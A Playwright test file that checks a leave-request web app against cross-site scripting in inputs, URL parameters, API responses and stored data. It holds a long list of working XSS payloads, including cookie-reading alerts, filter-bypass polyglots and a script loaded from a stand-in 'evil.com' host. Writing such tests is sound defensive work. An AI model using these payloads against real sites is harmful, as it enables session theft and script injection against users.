/**
 * Cross-Site Scripting (XSS) Security Tests
 * US-014: Security Testing
 *
 * Tests verify:
 * - Input fields properly sanitize/escape XSS payloads
 * - URL parameters are sanitized
 * - API responses escape user-controlled data
 * - React's built-in XSS protection is not bypassed
 */

import { test, expect } from '@playwright/test';

// Common XSS payloads to test
const XSS_PAYLOADS = [
  // Script tag variations
  '<script>alert("XSS")</script>',
  '<script>alert(document.cookie)</script>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '<script src="https://evil.com/xss.js"></script>',
  '<script type="text/javascript">alert("XSS")</script>',

  // Event handlers
  '<img src=x onerror=alert("XSS")>',
  '<img src="x" onerror="alert(\'XSS\')">',
  '<body onload=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',

  // JavaScript URIs
  'javascript:alert("XSS")',
  'javascript:alert(document.cookie)',
  'JaVaScRiPt:alert("XSS")',
  'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',

  // Data URIs
  'data:text/html,<script>alert("XSS")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',

  // SVG-based XSS
  '<svg><script>alert("XSS")</script></svg>',
  '<svg/onload=alert("XSS")>',
  '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
  '<svg><set onbegin=alert("XSS") attributeName=x to="s">',

  // HTML injection
  '<iframe src="javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
  '<base href="javascript:alert(\'XSS\');//">',

  // Template literal injection (for React)
  '${alert("XSS")}',
  '{{constructor.constructor("alert(1)")()}}',

  // Breaking out of attributes
  '"><script>alert("XSS")</script>',
  "' onclick='alert(1)'",
  '" onmouseover="alert(1)"',
  '"><img src=x onerror=alert("XSS")>',

  // Encoding bypass attempts
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
  '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',

  // Polyglot XSS
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
  '"><img src=x:x onerror=alert(1)>',
  '\'"--></style></script><script>alert(1)</script>',

  // DOM-based XSS vectors
  '#<script>alert("XSS")</script>',
  '?name=<script>alert("XSS")</script>',
];

// Payloads specifically for input fields
const INPUT_XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "' onclick='alert(1)'",
];

test.describe('XSS Prevention - Input Fields', () => {
  test.describe('Form Input Sanitization', () => {
    test('Leave request reason field sanitizes XSS', async ({ page }) => {
      await page.goto('/login');
      await page.waitForLoadState('networkidle');

      // Note: Full form XSS testing would require authentication
      // This test verifies the form structure is present
      const pageContent = await page.content();
      expect(pageContent).not.toContain('<script>alert');
    });

    test('Search input sanitizes XSS payloads', async ({ page }) => {
      await page.goto('/login');
      await page.waitForLoadState('networkidle');

      // Navigate with XSS in URL params
      await page.goto('/login?error=<script>alert("XSS")</script>');
      await page.waitForLoadState('networkidle');

      // Get the rendered HTML
      const pageContent = await page.content();

      // Script tags should be escaped or removed
      expect(pageContent).not.toContain('<script>alert');
      expect(pageContent).not.toContain('onerror=alert');
    });

    test('Error messages do not render XSS from URL params', async ({ page }) => {
      const xssPayloads = [
        'error=<script>alert(1)</script>',
        'error=<img src=x onerror=alert(1)>',
        'message="><script>alert(1)</script>',
      ];

      for (const payload of xssPayloads) {
        await page.goto(`/login?${payload}`);
        await page.waitForLoadState('networkidle');

        const content = await page.content();
        expect(content).not.toContain('<script>alert');
        expect(content).not.toContain('onerror=alert');
      }
    });
  });

  test.describe('URL Parameter XSS Prevention', () => {
    test('Redirect URL parameter is sanitized', async ({ page }) => {
      // Test common redirect parameter exploits
      const xssUrls = [
        '/login?from=javascript:alert(1)',
        '/login?redirect=javascript:alert(document.cookie)',
        '/login?callbackUrl=<script>alert(1)</script>',
        '/login?next=data:text/html,<script>alert(1)</script>',
      ];

      for (const url of xssUrls) {
        await page.goto(url);
        await page.waitForLoadState('networkidle');

        // Check that javascript: URLs are not in href attributes
        const links = await page.$$eval('a[href]', (anchors) =>
          anchors.map((a) => a.getAttribute('href'))
        );

        for (const href of links) {
          if (href) {
            expect(href.toLowerCase()).not.toContain('javascript:');
            expect(href.toLowerCase()).not.toContain('<script>');
          }
        }
      }
    });

    test('Page hash does not execute XSS', async ({ page }) => {
      await page.goto('/login#<img src=x onerror=alert(1)>');
      await page.waitForLoadState('networkidle');

      // No script should execute - verify no alert dialogs
      const dialogPromise = page.waitForEvent('dialog', { timeout: 2000 }).catch(() => null);
      const dialog = await dialogPromise;
      expect(dialog).toBeNull();
    });

    test('Query parameters with encoded XSS are sanitized', async ({ page }) => {
      const encodedPayloads = [
        '/login?error=%3Cscript%3Ealert(1)%3C/script%3E',
        '/login?msg=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
      ];

      for (const url of encodedPayloads) {
        await page.goto(url);
        await page.waitForLoadState('networkidle');

        const content = await page.content();
        expect(content).not.toContain('<script>alert');
        expect(content).not.toContain('onerror=alert');
      }
    });
  });
});

test.describe('XSS Prevention - API Endpoints', () => {
  test.describe('API Response Escaping', () => {
    test('Leave requests API escapes XSS in response', async ({ request }) => {
      const response = await request.get('/api/leave-requests', {
        params: { search: '<script>alert("XSS")</script>' },
        failOnStatusCode: false,
      });

      const body = await response.text();

      // If payload appears in response, it should be escaped
      if (body.includes('script')) {
        expect(body).not.toContain('<script>alert');
        expect(body).not.toContain('<SCRIPT>');
      }
    });

    test('API error responses escape user input', async ({ request }) => {
      const response = await request.get('/api/leave-requests/<script>alert(1)</script>', {
        failOnStatusCode: false,
      });

      const body = await response.text();

      // Error message should not contain unescaped script tags
      expect(body).not.toContain('<script>alert');
    });

    test('User API responses escape special characters', async ({ request }) => {
      const response = await request.get('/api/user', {
        params: { name: '"><script>alert("XSS")</script>' },
        failOnStatusCode: false,
      });

      const body = await response.text();

      // Verify proper escaping
      expect(body).not.toContain('"><script>');
    });
  });

  test.describe('POST Request XSS Prevention', () => {
    test('Leave request creation sanitizes XSS in reason field', async ({ request }) => {
      const maliciousData = {
        reason: '<script>alert("XSS")</script>Test leave',
        notes: '<img src=x onerror=alert("XSS")>Some notes',
        startDate: '2024-01-01',
        endDate: '2024-01-02',
      };

      const response = await request.post('/api/leave-requests', {
        data: maliciousData,
        failOnStatusCode: false,
      });

      // If accepted, verify XSS is escaped in response
      const body = await response.text();
      expect(body).not.toContain('<script>alert');
      expect(body).not.toContain('onerror=alert');
    });

    test('WFH request sanitizes XSS in all text fields', async ({ request }) => {
      const maliciousData = {
        reason: '<svg/onload=alert("XSS")>Work from home',
        location: '"><script>alert(1)</script>Home',
      };

      const response = await request.post('/api/wfh-requests', {
        data: maliciousData,
        failOnStatusCode: false,
      });

      const body = await response.text();
      expect(body).not.toContain('<svg/onload');
      expect(body).not.toContain('"><script>');
    });
  });
});

test.describe('XSS Prevention - Content Security', () => {
  test.describe('Content-Type Headers', () => {
    test('API responses have correct Content-Type', async ({ request }) => {
      const response = await request.get('/api/auth/providers', {
        failOnStatusCode: false,
      });

      const contentType = response.headers()['content-type'] || '';
      // JSON responses should not be rendered as HTML
      if (response.ok()) {
        expect(contentType).toContain('application/json');
      }
    });

    test('HTML responses have X-Content-Type-Options: nosniff', async ({ request }) => {
      const response = await request.get('/login');

      const xContentType = response.headers()['x-content-type-options'];
      expect(xContentType).toBe('nosniff');
    });
  });

  test.describe('XSS Protection Headers', () => {
    test('X-XSS-Protection header is set', async ({ request }) => {
      const response = await request.get('/login');

      const xssProtection = response.headers()['x-xss-protection'];
      expect(xssProtection).toBeDefined();
      expect(xssProtection).toContain('1');
    });
  });
});

test.describe('XSS Prevention - DOM-Based XSS', () => {
  test('Page does not have dangerous innerHTML usage', async ({ page }) => {
    await page.goto('/login');
    await page.waitForLoadState('networkidle');

    // Check for common DOM XSS sinks
    const dangerousPatterns = await page.evaluate(() => {
      const issues: string[] = [];

      // Check if document.write is used (usually bad)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((document as any)._documentWriteCalls) {
        issues.push('document.write detected');
      }

      // Check for eval in inline scripts (simplified check)
      const scripts = document.querySelectorAll('script:not([src])');
      scripts.forEach((script) => {
        if (script.textContent?.includes('eval(')) {
          issues.push('eval usage detected');
        }
      });

      return issues;
    });

    // Should not have dangerous patterns
    expect(dangerousPatterns).toHaveLength(0);
  });

  test('React renders user input safely', async ({ page }) => {
    // Navigate with XSS attempt in URL
    await page.goto('/login?error=<img/src/onerror=alert(1)>');
    await page.waitForLoadState('networkidle');

    // Listen for any dialog (alert/confirm/prompt)
    let dialogOpened = false;
    page.on('dialog', () => {
      dialogOpened = true;
    });

    // Wait a moment for any XSS to execute
    await page.waitForTimeout(1000);

    // No dialog should have opened
    expect(dialogOpened).toBe(false);
  });
});

test.describe('XSS Prevention - Stored XSS', () => {
  test('User-controlled data stored in DB is escaped on retrieval', async ({ request }) => {
    // Attempt to store XSS payload
    const storeResponse = await request.post('/api/leave-requests', {
      data: {
        reason: 'Test<script>alert("stored-xss")</script>',
        startDate: '2024-06-01',
        endDate: '2024-06-02',
      },
      failOnStatusCode: false,
    });

    // Regardless of store success, verify retrieval is safe
    const getResponse = await request.get('/api/leave-requests', {
      failOnStatusCode: false,
    });

    const body = await getResponse.text();
    // Any stored data should be properly escaped
    if (body.includes('stored-xss')) {
      expect(body).not.toContain('<script>alert("stored-xss")</script>');
    }
  });
});

test.describe('XSS Prevention - Edge Cases', () => {
  test('Handles null bytes in XSS payloads', async ({ page }) => {
    await page.goto('/login?error=<scr\x00ipt>alert(1)</scr\x00ipt>');
    await page.waitForLoadState('networkidle');

    const content = await page.content();
    expect(content).not.toContain('<script>alert');
  });

  test('Handles UTF-8 encoded XSS', async ({ page }) => {
    await page.goto('/login?error=＜script＞alert(1)＜/script＞');
    await page.waitForLoadState('networkidle');

    let dialogOpened = false;
    page.on('dialog', () => {
      dialogOpened = true;
    });

    await page.waitForTimeout(500);
    expect(dialogOpened).toBe(false);
  });

  test('Handles CSS-based XSS attempts', async ({ page }) => {
    await page.goto('/login?style=expression(alert(1))');
    await page.waitForLoadState('networkidle');

    const content = await page.content();
    expect(content).not.toContain('expression(');
  });
});
